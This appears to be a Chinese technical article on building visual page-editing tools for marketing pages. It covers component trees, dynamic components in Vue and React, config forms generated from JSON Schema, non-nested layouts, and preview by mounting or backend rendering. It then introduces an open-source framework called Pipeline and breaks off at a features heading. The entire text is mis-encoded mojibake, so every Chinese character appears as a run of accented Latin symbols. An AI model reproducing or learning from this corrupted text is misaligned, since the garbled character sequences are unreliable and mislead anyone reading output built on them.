å®Œæˆå¦ä¸€ä¸ªå®Œæ•´çš„ä¸šåŠ¡åŠŸèƒ½. é¡µé¢ç¼–è¾‘é¡µé¢ç”±é¡µé¢ç»„ä»¶ç»„åˆè€Œæˆ, é¡µé¢çš„ç¼–è¾‘å…¶å®æ˜¯å¯¹é¡µé¢ç»„ä»¶è¿›è¡Œé‡æ–°ç»„åˆ, å¹¶ç¼–è¾‘å„é¡µé¢ç»„ä»¶çš„å†…å®¹. é¡µé¢ç¼–è¾‘åŒ…å«2ä¸ªéƒ¨åˆ†: ç¼–è¾‘é¡µé¢ç»„ä»¶å’Œç¼–è¾‘é¡µé¢å†…å®¹. ç¼–è¾‘é¡µé¢ç»„ä»¶ç»„ä»¶æ ‘ä½¿ç”¨ç»„ä»¶åŒ–çš„æ–¹å¼æ¥ç»„ç»‡é¡µé¢, é¡µé¢å¯ä»¥è®¤ä¸ºæ˜¯ä¸€æ£µç»„ä»¶æ ‘, å¦‚ä¸‹å›¾æ‰€ç¤º, æ ‘ä¸­çš„èŠ‚ç‚¹ä¸ºé¡µé¢ç»„ä»¶, é¡µé¢ç»„ä»¶å¯ä»¥åŒ…å«å­ç»„ä»¶. åœ¨ä»£ç ç¼–å†™ä¸Š, é€šè¿‡ç»„ä»¶æ ‡ç­¾çš„ç»„åˆæ¥å£°æ˜ä¸€æ£µç»„ä»¶æ ‘, å¹¶åœ¨æ‰“åŒ…æ—¶ç”Ÿæˆé¡µé¢èµ„æº, åœ¨è¿è¡Œæ—¶åŠ è½½é¡µé¢èµ„æºæ¸²æŸ“å‡ºé¡µé¢. react å’Œ vue çš„ç»„ä»¶æ ‘å£°æ˜ç¤ºä¾‹: ç¼–è¾‘é¡µé¢ç»„ä»¶çš„ä¸€ä¸ªå¯è¡Œæ–¹å¼æ˜¯: åŠ¨æ€åœ°ç»™é¡µé¢æºç æ·»åŠ ç»„ä»¶, ç„¶åé‡æ–°æ‰“åŒ…ç”Ÿæˆé¡µé¢. å¦‚é€šè¿‡å¯è§†åŒ–çš„æ–¹å¼æ›¿æ¢ Leftç»„ä»¶ ä¸º NewLeftç»„ä»¶ å, å¯¹æºç çš„ç»„ä»¶æ ‘å£°æ˜åšæ›¿æ¢, å°† Left æ ‡ç­¾æ›¿æ¢ä¸º NewLeft æ ‡ç­¾. åŠ¨æ€ç»„ä»¶ä¸€äº›å‰ç«¯æ¡†æ¶æ”¯æŒåŠ¨æ€ç»„ä»¶, å¯ä»¥æ ¹æ®ç»„ä»¶æ ‘å£°æ˜åŠ¨æ€æ¸²æŸ“å‡ºç»„ä»¶, è€Œæ— éœ€åœ¨æ„å»ºå‰å°±å®šä¹‰å¥½é¡µé¢çš„ç»„ä»¶æ ‘ç»“æ„. å¯¹åŠ¨æ€ç»„ä»¶é¡µé¢å®ç°å¯è§†åŒ–ç»„ä»¶ç¼–è¾‘æ—¶, å¯ä»¥åªç¼–è¾‘ç»„ä»¶æ ‘å£°æ˜æ–‡ä»¶, ç„¶åå°†ç»„ä»¶æ ‘å£°æ˜ä¼ å…¥æå‰æ‰“åŒ…å¥½çš„é¡µé¢ä¸­è¿›è¡Œæ¸²æŸ“. é‡‡ç”¨åŠ¨æ€ç»„ä»¶å¯ä»¥é¿å…é‡æ–°æ‰“åŒ…çš„è€—æ—¶, å¿«é€Ÿç”Ÿæˆæ–°é¡µé¢. Vue æ ¹æ®ç»„ä»¶æ ‘å£°æ˜åŠ¨æ€åœ°æ¸²æŸ“ç»„ä»¶ç¤ºä¾‹å¦‚ä¸‹å›¾, vue åŠ¨æ€ç»„ä»¶ä½¿ç”¨ compontent å…³é”®å­—æ¥å£°æ˜, å¹¶é€šè¿‡ is å±æ€§æ¥å†³å®šå®ä¾‹åŒ–çš„å…·ä½“ç»„ä»¶. å¯¹äº react, ç»„ä»¶æ˜¯ä¸€ä¸ª js å¯¹è±¡, ç›´æ¥åœ¨ jsx ä¸­æŒ‰ç…§ç»„ä»¶åç§°è¿”å›å¯¹åº”ç»„ä»¶å°±å¯ä»¥äº†. ç¼–è¾‘é¡µé¢å†…å®¹ç»„ä»¶åŒ–é¡µé¢çš„é¡µé¢å†…å®¹ç¼–è¾‘, æ˜¯å¯¹é¡µé¢ä¸­å„ä¸ªç»„ä»¶çš„ç»„ä»¶å±æ€§(Props)è¿›è¡Œé…ç½®. ç»„ä»¶é…ç½®æ•°æ®ä¸€ä¸ªç»„ä»¶åŒ…å«ç»„ä»¶å±æ€§(Props), ç»„ä»¶çŠ¶æ€(State), ç»„ä»¶HTMLæ¨¡æ¿(Template), ç»„ä»¶ä¸šåŠ¡é€»è¾‘(Javascript), ç»„ä»¶æ ·å¼å¸ƒå±€(Style)ç­‰å‡ ä¸ªéƒ¨åˆ†. ç»„ä»¶çš„é…ç½®æ•°æ®é€šè¿‡ç»„ä»¶æš´éœ²çš„ Props æ³¨å…¥åˆ°ç»„ä»¶ä¸­, åœ¨ç»„ä»¶å†…éƒ¨ Props ä½œä¸ºå¸¸é‡åˆ†å‘ç»™ State, Template, Javascript, Style ç­‰å…¶ä»–ç»„ä»¶å†…å®¹, ç”±ç»„ä»¶å†…å®¹æ¸²æŸ“å‡ºè§†å›¾. ç»„ä»¶å·®å¼‚åŒ–ç»„ä»¶æ˜¯ä¸šåŠ¡å†…å®¹çš„å‘ˆç°è½½ä½“, ä¸åŒçš„ä¸šåŠ¡å†…å®¹, å°è£…åœ¨ä¸åŒçš„ä¸šåŠ¡ç»„ä»¶ä¸­. æ‰€ä»¥é¡µé¢æ¨¡æ¿ä¸­çš„ç»„ä»¶æ˜¯å·®å¼‚åŒ–çš„, å·®å¼‚ç‚¹ä½“ç°åœ¨ç»„ä»¶çš„ Props, State, Template, Javascript, Style ç­‰ç»„ä»¶å†…å®¹ä¸Š. åœ¨ç¼–è¾‘ä¸åŒç»„ä»¶å†…å®¹æ—¶, ç»„ä»¶é…ç½®æ•°æ®çš„æ•°æ®ç»“æ„æ˜¯ä¹Ÿæ˜¯å·®å¼‚åŒ–çš„. å¦‚ä¸‹å›¾ç¤ºçš„é¡µé¢åŒ…å«3ä¸ªç»„ä»¶: å¤´éƒ¨ç»„ä»¶, é—´éš”åŒºç»„ä»¶å’Œå¤©æ°”ç»„ä»¶. å¤´éƒ¨ç»„ä»¶çš„é…ç½®æ•°æ®ä¸ºå¤´éƒ¨æ ‡é¢˜å’Œå¤´éƒ¨å›¾ç‰‡ç­‰; é—´éš”å»ç»„ä»¶çš„é…ç½®æ•°æ®ä¸ºé—´éš”æç¤ºæ–‡æœ¬ç­‰; å¤©æ°”ç»„ä»¶çš„é…ç½®æ•°æ®ä¸ºåŸå¸‚åç§°. ä¸åŒçš„ç»„ä»¶éœ€è¦ä¸åŒçš„é…ç½®æ•°æ®. éœ€è¦ä¸ºå„ç»„ä»¶å·®å¼‚åŒ–çš„é…ç½®æ•°æ®å®šä¹‰æ•°æ®ç»“æ„å’Œå­—æ®µç±»å‹, ç†æƒ³çš„é…ç½®æ•°æ®æ ¼å¼ä¸º JSON, å› ä¸ºå…¶æ ¼å¼çµæ´», æ”¯æŒæ•°æ®åµŒå¥—, ä¸”å‰ç«¯å‹å¥½. ç»„ä»¶é…ç½®è¡¨å•é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·çš„ä¸»è¦ä½¿ç”¨äººå‘˜æ˜¯è¿è¥/äº§å“, å¦‚æœè®©è¿è¥/äº§å“äººå‘˜ç›´æ¥ç¼–è¾‘æ–‡æœ¬æ ¼å¼çš„ç»„ä»¶é…ç½®æ•°æ®, æ“ä½œä¸å‹å¥½å¹¶ä¸”å®¹æ˜“å‡ºé”™. éœ€æä¾›å¯è§†åŒ–çš„ç¼–è¾‘æ–¹å¼ â€“ ä½¿ç”¨ Form è¡¨å•æ¥å¡«å…¥é…ç½®æ•°æ®. Form è¡¨å•æ˜¯é¡µé¢ä¸­æ•°æ®äº¤äº’çš„åŸºæœ¬å½¢å¼, éå¼€å‘äººå‘˜ä½¿ç”¨ä¹Ÿæ²¡æœ‰æŠ€æœ¯é—¨æ§›. ä½¿ç”¨é…ç½®è¡¨å•æ¥å¡«å…¥é…ç½®æ•°æ®æœ‰2ä¸ªå¥½å¤„: é…ç½®è¡¨å•äº¤äº’åŠŸèƒ½å®Œå–„, å®¹æ˜“ä½¿ç”¨. é…ç½®è¡¨å•å¯ä»¥æ·»åŠ æ ¡éªŒé€»è¾‘, é¿å…å¡«å…¥é”™è¯¯çš„é…ç½®æ•°æ®. å¦‚ä¸Šå›¾æ‰€ç¤º, ç”±äºç»„ä»¶é…ç½®æ•°æ®çš„å·®å¼‚åŒ–, ç»„ä»¶é…ç½®è¡¨å•ä¹Ÿæ˜¯å·®å¼‚åŒ–çš„, éœ€ä¸ºç»„ä»¶åº“ä¸­çš„æ¯ä¸ªç»„ä»¶æä¾›ç›¸åº”çš„é…ç½®è¡¨å•. å¦‚æœä¸ºæ¯ä¸ªç»„ä»¶éƒ½ç¼–å†™ä¸€ä¸ªè¡¨å•é¡µé¢, å·¥ä½œé‡è¾ƒå¤§; å¯¹äºå¤æ‚çš„é…ç½®é¡¹, è¡¨å•é¡µé¢çš„ç¼–å†™å·¥ä½œé‡å¯èƒ½ä¼šå¤§äºé¡µé¢ç»„ä»¶çš„å¼€å‘å·¥ä½œé‡. éœ€è¦é‡ç‚¹è€ƒè™‘æä¾›é…ç½®è¡¨å•çš„æ–¹å¼. æŠ€æœ¯éš¾ç‚¹2: å¦‚ä½•ç”¨æœ€ç®€å•çš„æ–¹å¼ç”Ÿæˆé…ç½®æ•°æ®ç¼–è¾‘è¡¨å•. ç»„ä»¶å±‚çº§å…³ç³»ç»„ä»¶æ ‘å®šä¹‰äº†ç»„ä»¶é—´çˆ¶å­å…„å¼Ÿçš„å±‚çº§å…³ç³», çˆ¶å­ç»„ä»¶é€šè¿‡æ•°æ®æµå’Œäº‹ä»¶è¿›è¡Œå…³è”: æ•°æ®ä»çˆ¶ç»„ä»¶çš„ State ä¼ é€’åˆ°å­ç»„ä»¶çš„ Props; å­ç»„ä»¶çš„å˜æ›´è§¦å‘ Event é€šçŸ¥çˆ¶ç»„ä»¶. å±‚çº§å…³ç³»å¯¹æ•°æ®æµå’Œå¸ƒå±€çš„å½±å“é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·ç¼–è¾‘ç»„ä»¶æ ‘æ—¶, ä¼šä¿®æ”¹ç»„ä»¶æ•°æ®æµ. è€Œä¸åŒç»„ä»¶çš„ Props å’Œ State æ˜¯å¼‚æ„çš„, åœ¨ç¼–è¾‘ç»„ä»¶æ ‘æ—¶, éœ€è¦å¤„ç†ä¸åŒç»„ä»¶äº§ç”Ÿå±‚çº§å…³ç³»åå¯¹æ•°æ®æµçš„å½±å“. å¦‚ä¸‹å›¾, çˆ¶ç»„ä»¶çš„ State åªåŒ…å«å­ç»„ä»¶Açš„ Props, å°†å­ç»„ä»¶BæŒ‚è½½ä¸ºçˆ¶ç»„ä»¶çš„å­ç»„ä»¶, çˆ¶ç»„ä»¶æ²¡æœ‰å­ç»„ä»¶Bçš„ Props, ä¼šå¯¼è‡´æ— æ³•æ¸²æŸ“å­ç»„ä»¶B. åŒç†, ä¸åŒçš„ç»„ä»¶æœ‰ä¸åŒçš„æ ·å¼å¸ƒå±€, ç¼–è¾‘ç»„ä»¶æ ‘æ—¶, éœ€è¦å¤„ç†ä¸åŒç»„ä»¶äº§ç”Ÿå±‚çº§å…³ç³»åå¸¦æ¥çš„å¸ƒå±€å½±å“. å¦‚ä¸‹å›¾, ä¸€ä¸ªçˆ¶ç»„ä»¶ä¸ºè¡Œå†…ç»„ä»¶, ç»™å…¶æ·»åŠ ä¸€ä¸ªå—çº§ç»„ä»¶ä½œä¸ºå­ç»„ä»¶, æ¸²æŸ“åå¯èƒ½ä¼šå¯¼è‡´è¡Œå†…ç»„ä»¶è¢«å—çº§ç»„ä»¶æ’‘å¼€. æ‰€ä»¥è®¾è®¡é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·çš„ç»„ä»¶æ ‘ç¼–è¾‘åŠŸèƒ½æ—¶, éœ€è¦é‡ç‚¹å…³æ³¨ç»„ä»¶æ ‘çš„å±‚çº§å…³ç³», è§£å†³ç»„ä»¶é—´æ•°æ®ä¾èµ–å’Œç»„ä»¶é—´å¸ƒå±€é€‚é…é—®é¢˜. é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·éœ€è¦åˆ¶è®¢ç»„ä»¶åµŒå¥—çš„è§„åˆ™å’Œçº¦æŸ, é€šè¿‡ç»„ä»¶åµŒå¥—è§„åˆ™æ¥ç¡®ä¿å¯è§†åŒ–ç¼–è¾‘åçš„ç»„ä»¶æ ‘æ­£å¸¸æ¸²æŸ“. æŠ€æœ¯éš¾ç‚¹3: å¦‚ä½•ç»„ç»‡é¡µé¢ç»„ä»¶çš„å±‚çº§å…³ç³». ä½¿ç”¨ç»„ä»¶åµŒå¥—çš„æ­å»ºå·¥å…·ç¤ºä¾‹: ä¸åµŒå¥—çš„å‰ç«¯æ¡†æ¶ç»„ä»¶å¯ä»¥æƒ³è±¡, ç»„ä»¶çš„åµŒå¥—ä¼šåŠ å¤§é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·çš„æ¶æ„è®¾è®¡å’Œå¼€å‘éš¾åº¦. æˆ‘ä»¬æ³¨æ„åˆ°, è¥é”€æ´»åŠ¨çš„ä¸»è¦å¹³å°æ˜¯ç§»åŠ¨ç«¯, ç§»åŠ¨ç«¯é¡µé¢çš„å¸¸ç”¨çš„å¸ƒå±€ç­–ç•¥æ˜¯: å®½åº¦é“ºæ»¡, é«˜åº¦æ»šåŠ¨. å¦‚æœå‰ç«¯æ¡†æ¶ç»„ä»¶éƒ½è®¾ç½®ä¸ºé“ºæ»¡å®½åº¦, é¡µé¢å±•ç¤ºæ—¶ç»„ä»¶åªéœ€åœ¨æµè§ˆå™¨å‚ç›´æ–¹å‘ä¸Šé¡ºåºæ’åˆ—, åˆ™ç»„ä»¶ç»„åˆæ—¶ä¸éœ€è¦åµŒå¥— â€“ æ‰€æœ‰ç»„ä»¶äº’ä¸ºå…„å¼ŸèŠ‚ç‚¹. è¿™ç§é“ºæ»¡é¡µé¢å®½åº¦çš„ç»„ä»¶, éå¸¸é€‚åˆæ­å»ºç§»åŠ¨ç«¯é¡µé¢çš„åœºæ™¯: åœ¨æ‰¿è½½é¡µé¢é€»è¾‘çš„åŒæ—¶, ä½¿å¾—é¡µé¢çš„ç¼–è¾‘æ›´åŠ ç®€å•, ä½¿ç”¨è€…åªéœ€å¤„ç†ç»„ä»¶çš„é¡ºåº, æ— éœ€å¤„ç†ç»„ä»¶çš„åµŒå¥—. åœ¨ç§»åŠ¨ç«¯, ä½¿ç”¨éåµŒå¥—ç»„ä»¶å±‚çº§è§„åˆ™çš„é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·æœ‰: é˜¿é‡Œäº‘å‡¤è¶ã€pipeline ç­‰. é˜¿é‡Œäº‘å‡¤è¶å›¾ç¤º: å¯è§†åŒ–æ­å»ºPCç«¯ä¸­åå°ç³»ç»Ÿé¡µé¢çš„å·¥å…·, åŒæ ·å¯ä»¥é‡‡ç”¨ä¸åµŒå¥—ç»„ä»¶å±‚çº§è§„åˆ™, å¦‚é˜¿é‡Œçš„é£å†°: é¡µé¢é¢„è§ˆé¡µé¢å®æ—¶é¢„è§ˆæ˜¯é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·çš„å¿…è¦éƒ¨åˆ†, ä½¿ç”¨äººå‘˜å¯ä»¥åœ¨é€šè¿‡é¡µé¢é¢„è§ˆæ¥æŸ¥çœ‹å’ŒéªŒè¯å¯è§†åŒ–ç¼–è¾‘çš„æ•ˆæœ. é¡µé¢é¢„è§ˆç¤ºä¾‹: ç”¨æˆ·çš„å¯è§†åŒ–ç¼–è¾‘åŒ…æ‹¬ä¿®æ”¹ç»„ä»¶æ ‘å’Œä¿®æ”¹ç»„ä»¶é…ç½®æ•°æ®. å¦‚ä¸‹å›¾, ç”¨æˆ·ä¿®æ”¹é¡µé¢å, éœ€è¦é‡æ–°æ¸²æŸ“é¡µé¢ç»„ä»¶, å¾—åˆ°æ–°çš„é¢„è§ˆé¡µé¢. å®ç°é¡µé¢é¢„è§ˆæœ‰ä¸¤ç§æ–¹å¼: é¡µé¢æŒ‚è½½å’Œåå°æ¸²æŸ“. é¡µé¢æŒ‚è½½é¡µé¢æŒ‚è½½æŒ‡åœ¨ç¼–è¾‘å™¨å‰ç«¯é¡µé¢çš„æŸä¸ªå…ƒç´ èŠ‚ç‚¹(div)ä¸Šæ¸²æŸ“å‡ºç”¨æˆ·ç¼–è¾‘çš„æ•ˆæœ. é¡µé¢æŒ‚è½½æµç¨‹å›¾å¦‚ä¸‹: ä½¿ç”¨é¡µé¢æŒ‚è½½çš„é¢„è§ˆæ–¹å¼, ç¼–è¾‘å™¨å‰ç«¯é¡µé¢éœ€è¦æä¾›ç»„ä»¶åº“ç»„ä»¶æ¸²æŸ“ç¯å¢ƒ(ç»„ä»¶åº“å‰ç«¯æ¡†æ¶); ä¸ºå®ç°å‰ç«¯æ¸²æŸ“, ç¼–è¾‘å™¨å‰ç«¯æºç éœ€å¼•å…¥ç»„ä»¶åº“ç»„ä»¶æºç , åç»­ç»„ä»¶åº“æ›´æ–°, ç¼–è¾‘å™¨éœ€è¦åŒæ­¥æ›´æ–°. é¡µé¢æŒ‚è½½æ–¹å¼æœ‰ä»¥ä¸‹ç‰¹ç‚¹: å®ç°é¡µé¢é¢„è§ˆæŠ€æœ¯æ–¹æ¡ˆå¯è¡Œ, å®æ—¶æ¸²æŸ“é€Ÿåº¦å¿«. ä¸ºå®ç°æ¸²æŸ“, ç¼–è¾‘å™¨çš„æŠ€æœ¯é€‰å‹éœ€å’Œç»„ä»¶åº“å‰ç«¯æ¡†æ¶ä¸€è‡´. ç¼–è¾‘å™¨æºç å’Œç»„ä»¶åº“æºç è€¦åˆ. ç»„ä»¶åº“ç»„ä»¶æ¸²æŸ“åçš„ä»£ç é€»è¾‘å’Œæ ·å¼å¸ƒå±€, å¯èƒ½ä¼šæ±¡æŸ“ç¼–è¾‘å™¨é¡µé¢. åå°æ¸²æŸ“åå°æ¸²æŸ“æŒ‡åœ¨åå°è¿›è¡Œç”¨æˆ·ç¼–è¾‘ç»“æœé¡µé¢çš„æ¸²æŸ“å’Œç”Ÿæˆ, ç¼–è¾‘å™¨å‰ç«¯é¡µé¢é€šè¿‡ iframe åŠ è½½å’Œå±•ç¤ºç»“æœé¡µé¢. åå°æ¸²æŸ“æµç¨‹å›¾å¦‚ä¸‹: ä½¿ç”¨åå°æ¸²æŸ“çš„é¢„è§ˆæ–¹å¼, ç¼–è¾‘å™¨å‰ç«¯é¡µé¢å¹¶ä¸éœ€è¦æ¸²æŸ“ç»„ä»¶åº“çš„ç»„ä»¶; ç”šè‡³ä¸éœ€è¦ç»„ä»¶æºç , åªéœ€çŸ¥é“å„ä¸ªç»„ä»¶çš„æè¿°ä¿¡æ¯. åå°æ¸²æŸ“æœ‰ä»¥ä¸‹ç‰¹ç‚¹: å¯ä»¥å®ç°ç¼–è¾‘å™¨å’Œç»„ä»¶åº“å‰ç«¯æ¡†æ¶çš„åˆ†ç¦». å¯ä»¥å®ç°ç¼–è¾‘å™¨å’Œç»„ä»¶åº“å„ç»„ä»¶çš„åˆ†ç¦». å¯ä»¥é¿å…é¢„è§ˆé¡µé¢çš„é€»è¾‘å’Œæ ·å¼æ±¡æŸ“ç¼–è¾‘å™¨ç¯å¢ƒ. è¦æ±‚åå°å’Œç»„ä»¶åº“æä¾›é¡µé¢åå°æ¸²æŸ“èƒ½åŠ›, å¹¶è¦æ±‚åå°æ¸²æŸ“é€Ÿåº¦å¿«, ç”¨æˆ·éœ€è¦â€å®æ—¶â€é¢„è§ˆ. éš¾ç‚¹4: å¦‚ä½•å®ç°ç»„ä»¶åº“çš„å¿«é€Ÿåå°æ¸²æŸ“, ä»è€Œå®ç°ç¼–è¾‘å™¨å’Œç»„ä»¶åº“å‰ç«¯æ¡†æ¶çš„åˆ†ç¦». é¡µé¢æ„å»ºé¡µé¢æ„å»ºæ˜¯ç»„ä»¶åŒ–å‰ç«¯æºç ç”Ÿæˆé¡µé¢èµ„æºçš„å¿…è¦ç¯èŠ‚: åœ¨å¼€å‘æ—¶éœ€è¦è¿›è¡Œå¼€å‘æ„å»ºæ¥è¿›è¡Œé¡µé¢è°ƒè¯•; åœ¨å¯è§†åŒ–ç¼–è¾‘åå¯èƒ½éœ€è¦é‡æ–°æ„å»ºæ¥ç”Ÿæˆé¢„è§ˆé¡µé¢; åœ¨å‘å¸ƒå‰éœ€è¦è¿›è¡Œç”Ÿäº§æ„å»º. åœ¨å¯è§†åŒ–æ­å»ºé¡µé¢æ—¶éœ€è¦â€œå®æ—¶â€é¢„è§ˆ, è¦æ±‚é¡µé¢é¡µé¢æ„å»ºæ•ˆç‡é«˜, å®ç°å¿«é€Ÿçš„æ„å»ºå’Œæ‰“åŒ…. æ›´è¿›ä¸€æ­¥, åå°æ¸²æŸ“å…¶å®å’ŒæœåŠ¡ç«¯æ¸²æŸ“å¾ˆåƒ, èƒ½å¦å€Ÿé‰´æœåŠ¡ç«¯æ¸²æŸ“çš„æŠ€æœ¯æ€è·¯. è‡ªå®šä¹‰æ¨¡æ¿å’Œç»„ä»¶å¼€å‘é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·åœ¨ä¸šåŠ¡ä¸­çš„è½åœ°, éœ€è¦æ ¹æ®ä¸åŒçš„ä¸šåŠ¡åœºæ™¯è¿›è¡Œä¸šåŠ¡ç»„ä»¶å’Œé¡µé¢æ¨¡æ¿çš„è‡ªå®šä¹‰å¼€å‘. è¿™å¯¹é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·æå‡º3ä¸ªè¦æ±‚: é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·è¦æ”¯æŒä¸šåŠ¡ç°æœ‰çš„å‰ç«¯æ¡†æ¶. é¿å…åç»­ç»„ä»¶å’Œæ¨¡æ¿è‡ªå®šä¹‰å¼€å‘æ—¶çš„å·¥ä½œé‡å’Œå‰²è£‚æ„Ÿ. æˆ‘ä»¬æ˜¯å¸Œæœ›å¤ç”¨ç°æœ‰å‰ç«¯æ¡†æ¶ç»„ä»¶, è€Œä¸æ˜¯ç”¨å¦ä¸€ä¸ªå‰ç«¯æ¡†æ¶é‡å†™ä¸€é. ç»„ä»¶å’Œæ¨¡æ¿çš„ç¼–å†™æ–¹å¼éœ€éµå¾ªè¾ƒç®€å•çš„ç¼–å†™çº¦å®š, é¿å…å¼€å‘äººå‘˜éš¾ä¸Šæ‰‹å’Œå†™èµ·æ¥ä¸èˆ’æœ. è‡ªå®šä¹‰æ¨¡æ¿å’Œç»„ä»¶å’Œåœ¨å¼€å‘æ¨¡å¼ä¸‹è¿›è¡Œè°ƒè¯•å’Œæµ‹è¯•. é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·å¿…ç„¶ä¼šå¯¹é¡µé¢æ¨¡æ¿å’Œé¡µé¢ç»„ä»¶çš„ç¼–ç æ–¹å¼è¿›è¡Œé™å®š. è¿™è¦æ±‚å°±é¡µé¢å¯è§†åŒ–å·¥å…·åœ¨é¡µé¢æ¨¡æ¿å’Œé¡µé¢ç»„ä»¶ä¸Šçš„çº¦æŸè¾ƒå°‘, å‡å°‘å¯¹å‰ç«¯æ¡†æ¶ä»£ç ç»„ç»‡æ–¹å¼çš„å…¥ä¾µç‚¹. ç†æƒ³çš„æ´»åŠ¨é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·, éœ€è¦å¯¹é¡µé¢åšä¸€äº›çº¦å®šå’Œçº¦æŸ, åœ¨å¯è§†åŒ–æ­å»ºæ—¶éµå¾ªå·¥å…·çº¦å®šå’Œçº¦æŸæ¥ç¼–è¾‘é¡µé¢. ä»é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·çš„æŠ€æœ¯è¦ç‚¹ä¸­, å¯ä»¥å½’çº³å‡ºæ´»åŠ¨é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·çš„ç†æƒ³å½¢æ€. é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·æœ‰ä¸åŒçš„æ¡†æ¶è®¾è®¡å’Œå®ç°æ–¹å¼, ä¸åŒçš„åŠŸèƒ½æœ‰ä¸åŒçš„é€‚ç”¨åœºæ™¯, è¯¦ç»†åˆ†ç±»å¯ä»¥å‚è€ƒç¬”è€…ä»¥å‰çš„æ–‡ç« : é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·å‰ç”Ÿä»Šä¸–. æ¦‚è¿°è¿è¥é¡µé¢æ­å»ºå·¥å…·, å®ç°åŸºäºæ¨¡æ¿çš„é¡µé¢ç”Ÿæˆ; å°†é¡µé¢çš„é€»è¾‘åŠŸèƒ½å°è£…åœ¨ç»„ä»¶å†…, å£°æ˜é¡µé¢é…ç½®æ•°æ®å¹¶æä¾›é…ç½®è¡¨å•, é€šè¿‡å¯¹é…ç½®è¡¨å•çš„æ•°æ®å¡«å……, è¿›è¡Œå°‘é‡é¡µé¢ç¼–è¾‘å°±å¯ä»¥å®Œæˆä¸šåŠ¡é¡µé¢æ­å»º. ä¸åµŒå¥—çš„ç»„ä»¶åœ¨ç¼–è¾‘è‡ªç”±åº¦çš„é€‰æ‹©ä¸Š, é€‰ç”¨ä¸åµŒå¥—çš„ç»„ä»¶.å„ç»„ä»¶é“ºæ»¡é¡µé¢å®½åº¦, åœ¨é¡µé¢é«˜åº¦æ–¹å‘é¡ºåºæ’åˆ—.è§£å†³ç»„ä»¶åµŒå¥—å¸¦æ¥çš„æ•°æ®æµé—®é¢˜. ä¸åµŒå¥—çš„ç»„ä»¶å¦‚ä¸‹å›¾å„ä¸ªçº¢æ¡†æ¡†èµ·æ¥çš„éƒ¨åˆ†æ‰€ç¤º. é…ç½®è¡¨å•è‡ªåŠ¨ç”Ÿæˆé…ç½®è¡¨å•çš„ä½œç”¨æ˜¯ç”Ÿæˆå’Œçº¦æŸ JSON é…ç½®æ•°æ®, ä¸šç•Œå·²æœ‰å¯¹ JSON è¿›è¡Œæè¿°å’Œè‡ªåŠ¨ç”Ÿæˆè¡¨å•çš„æ–¹æ¡ˆ â€“ JSON Schema. æŒ‰ç…§ JSON Schema è§„èŒƒå¯¹ JSON æ•°æ®è¿›è¡Œæè¿°, å¯ä»¥åŠ¨æ€æ¸²æŸ“å‡ºé…ç½®è¡¨å•; ä¸” JSON Schema å¯ä»¥å¯¹ç¼–è¾‘åçš„æ•°æ®åšæ ¼å¼æ ¡éªŒ, é¿å…ç¼–è¾‘é”™è¯¯. è¿™æ¯”ç¼–å†™ä¸€ä¸ªè¡¨å•é¡µé¢æ›´åŠ ç®€å•å’Œé«˜æ•ˆ. JSON Schema çš„è¯­æ³•å¹¶ä¸æ˜¯å¾ˆç²¾ç®€, äº‘å‡¤è¶çš„ Schema è¯­æ³• ç­‰æ–¹æ¡ˆæ›´ç®€æ´, ä½†æ˜¯äº‘å‡¤è¶çš„è¯­æ³•æ²¡æœ‰å¼€æºçš„è¡¨å•ç”Ÿæˆåº“æ”¯æŒ, åœ¨å¼€æºå®è·µä¸Šè¿˜æ˜¯ JSON Schema æœ€ä½³. ç†æƒ³æ´»åŠ¨é¡µé¢æ­å»ºå·¥å…·ç‰¹ç‚¹ é‡‡ç”¨ç»„ä»¶åŒ–å’Œé¡µé¢æ¨¡æ¿å®ç°é¡µé¢ç”Ÿæˆæ•ˆç‡çš„æå‡. é‡‡ç”¨ä¸åµŒå¥—çš„ç»„ä»¶å±‚çº§ç®€åŒ–æ•°æ®æµå’Œæ ·å¼å¸ƒå±€. é‡‡ç”¨ JSON Schema å£°æ˜é…ç½®æ•°æ®, è‡ªåŠ¨ç”Ÿæˆé…ç½®è¡¨å•. é‡‡ç”¨åå°æ¸²æŸ“, ä½¿ç¼–è¾‘ç³»ç»Ÿä¸ç»„ä»¶å‰ç«¯æ¡†æ¶è§£è€¦. åœ¨éµå¾ªç¼–è¾‘ç³»ç»Ÿçº¦å®šä¸‹, ç»„ä»¶å¯ä»¥è‡ªç”±æ‹“å±•, å‰ç«¯æ¡†æ¶å¯ä»¥è‡ªç”±é€‰æ‹©. é¡µé¢å¯è§†åŒ–æ­å»ºæ¡†æ¶ Pipelineç®€ä»‹Pipeline æ˜¯ä¸€ä¸ªå¼€æºçš„é¡µé¢å¯è§†åŒ–æ­å»ºæ¡†æ¶, ä¸»è¦ç”±ç¬”è€…åœ¨ç»´æŠ¤. Pipeline æ„ä¸ºæµæ°´çº¿, æœŸæœ› pipeline åƒå·¥å‚æµæ°´çº¿ä¸€æ ·å¯ä»¥é«˜æ•ˆåœ°ç»„è£…æ´»åŠ¨é¡µé¢. æ‰€è°“æ¡†æ¶, æ˜¯å®ƒå®ç°äº†é¡µé¢å¯è§†åŒ–æ­å»ºçš„åŸºæœ¬åŠŸèƒ½, è§£å†³äº†é¡µé¢å¯è§†åŒ–æ­å»ºçš„åŸºæœ¬éš¾ç‚¹, å¯ä»¥è®©å¼€å‘è€…å¿«é€Ÿæ‹¥æœ‰é¡µé¢æ­å»ºçš„èƒ½åŠ›, å¹¶æ”¯æŒç§æœ‰éƒ¨ç½²å’ŒäºŒæ¬¡å¼€å‘. é¡¹ç›®ä¿¡æ¯: é¡¹ç›®åœ°å€: github.com/page-pipeplâ€¦ ä½“éªŒåœ°å€: page-pipepline.github.io/pipeline-edâ€¦ é¡¹ç›®æ–‡æ¡£: github.com/page-pipeplâ€¦ åŠŸèƒ½ 